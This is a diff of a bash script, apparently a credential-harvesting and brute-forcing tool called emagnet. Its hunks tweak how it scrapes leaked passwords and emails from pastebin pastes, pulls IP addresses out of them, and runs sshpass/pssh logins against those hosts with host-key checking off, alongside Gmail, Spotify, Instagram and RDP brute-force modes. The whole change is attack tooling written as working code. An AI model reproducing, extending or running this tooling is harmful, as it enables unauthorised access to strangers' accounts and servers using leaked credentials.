@@ -437,14 +437,14 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
            printf "%64s \n\n" | tr ' ' '='
 	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
            printf "%18s \e[0;32mSPOTIFY\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
-          printf "%64s \n\n" | tr ' ' '='
+           printf "%64s \n\n" | tr ' ' '='
 	  elif [[ "$SBRUTEFORCE" = "true" ]]; then
            printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
 	  elif [[ "$IBRUTEFORCE" = "true" ]]; then
            printf "%17s \e[0;33mINSTAGRAM\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
-      elif [[ "$RBRUTEFORCE" = "true" ]]; then
+          elif [[ "$RBRUTEFORCE" = "true" ]]; then
            printf "%20s \e[1;31mRDP\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n\n"
            printf "%64s \n\n" | tr ' ' '='
 	  else
@@ -525,15 +525,15 @@ if [[ "$GBRUTEFORCE" = "true" ]]; then
 
 	  elif [[ "$PBRUTEFORCE" = "true" ]]; then
             sed -i '125d' "$CONF"
-     	      sed -i '125 i GBRUTEFORCE=false' "$CONF"
+     	    sed -i '125 i GBRUTEFORCE=false' "$CONF"
       	    sed -i '126d' "$CONF"
-     	      sed -i '126 i SBRUTEFORCE=false' "$CONF"
+     	    sed -i '126 i SBRUTEFORCE=false' "$CONF"
             sed -i '127d' "$CONF"
-     	      sed -i '127 i PBRUTEFORCE=true' "$CONF"
+     	    sed -i '127 i PBRUTEFORCE=true' "$CONF"
             sed -i '128d' "$CONF"
-     	      sed -i '128 i IBRUTEFORCE=false' "$CONF"
+     	    sed -i '128 i IBRUTEFORCE=false' "$CONF"
             sed -i '129d' "$CONF"
-     	      sed -i '129 i RBRUTEFORCE=false' "$CONF" 
+     	    sed -i '129 i RBRUTEFORCE=false' "$CONF" 
             emagnet_conf
             printf "%20s \e[1;34mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
             printf "\n%64s \n\n" | tr ' ' '='
@@ -654,9 +654,9 @@ if [[ -z "$SSHPASS" ]]; then
 fi
 
 SKIPLIST="^0\|^[0-9].[0-9].[0-9].*\|^[0-9]\..*\|^10\..*\|^192.168.*"
-grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
+#grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETTEMP" \
+grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETALL" \
 |awk -F':' '{print $2}' \
-|sort \
 |awk -F, '!seen[$1]++' > "$SSHPORTSCAN"
 
    if [[ $(cat $SSHPORTSCAN|wc -l) -lt "1" ]]; then
@@ -670,7 +670,7 @@ grep -Ewro '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$EMAGNETHOME/.temp" \
         printf "\n%64s\n" | tr ' ' '='
         printf "\n%15s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m TARGETS\e[0m\n\n"
         sleep 2
-        sshpass -p "$SSHPASS" pssh  -O "StrictHostKeyChecking=no" -I -A -h $SSHTARGETS -i "uptime" < $SSHTARGETS |grep --color -i 'success\|failure' 
+        sshpass -p "$SSHPASS" pssh  -O "StrictHostKeyChecking=no" -I -h $SSHTARGETS -i "uptime" < $SSHTARGETS |grep --color -i 'success\|failure' 
    fi
         sleep 4
 }
@@ -884,7 +884,6 @@ emagnet_main() {
 # emagnet-download since we just want to download new files that not already is in our all-files
       sed -i 's/^/https:\/\/pastebin.com\/raw\//g' "$HOME/.config/emagnet/tmp/.emagnet-download"
 
-
 #-----------------------------------------------------
 # If cloudfare is trigged, then we will do below 
 # - We wont be allowed to use wget without
@@ -903,7 +902,7 @@ curl -sL $PASTEBIN \
      -H 'Upgrade-Insecure-Requests: 1' \
      -H 'Cache-Control: max-age=0' \
      -H 'TE: Trailers' \
-     -o $EMAGNETTEMP/$(echo $line|sed 's:..*/::');done < "$HOME/.config/emagnet/tmp/.emagnet-download2" &> /dev/null
+     -o $EMAGNETTEMP/$(echo $line|sed 's:..*/::');done < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
 else
 # Downloading new pastes we found, no duplicates will be downloaded of course
      xargs -P "$(xargs --show-limits -s 1 2>&1|grep -i "parallelism"|awk '{print $8}')" -n 1 wget --user-agent="${USERAGENT}" -q -nc -P "$EMAGNETTEMP" < "$HOME/.config/emagnet/tmp/.emagnet-download" &> /dev/null
@@ -943,7 +942,6 @@ if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
             echo -e "                       - Files Downloaded\r             [\e[1;32m$tt\e[0m]"
             echo -e "                       - Passwords Found \r             [\e[1;32m$pt\e[0m]"
             echo -e "                       - Email Addresses Found \r             [\e[1;32m$et\e[0m]\n"
-            emagnet_move_realtime
             sleep 2
 
                if [[ "$GBRUTEFORCE" = "true" ]]; then
@@ -951,6 +949,8 @@ if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
                   printf "%16s";printf "BRUTE FORCING -- $(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mI\e[0;32mL\E[1;31m\e[0m") ACCOUNTS\e[0m\n\n"
                   emagnet_gmail_bruter
                 elif [[ "$SBRUTEFORCE" = "true" ]]; then
+                  printf "%64s \n\n" | tr ' ' '='
+                  printf "%15s";printf "BRUTE FORCING -- \e[1;34mSSH\e[0m ACCOUNTS\e[0m\n\n"
                   emagnet_sshbruter
                 elif [[ "$PBRUTEFORCE" = "true" ]]; then
                   printf "%64s \n\n" | tr ' ' '='
@@ -967,6 +967,8 @@ if [[ "$pt" -gt "0" ]] && [[ "$et" -gt "0" ]]; then
                 else
                   sleep 0
                fi
+# We want to move everything AFTER we bruteforced ;) 
+                 emagnet_move_realtime
 
 # If we found no passwords and mail addresses only we do below
 elif [[ "$pt" = "0" ]] && [[ "$et" -gt "0" ]]; then
@@ -1269,7 +1271,7 @@ case "${1}" in
               if [[ "$GBRUTEFORCE" = "true" ]]; then
                emagnet_run4ever
                emagnet_gmail_bruter
-#               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
+               mv $EMAGNETTEMP/* $EMAGNETHOME/all-files &> /dev/null
           fi
 
            elif [[ "$2" = "ssh" ]]; then
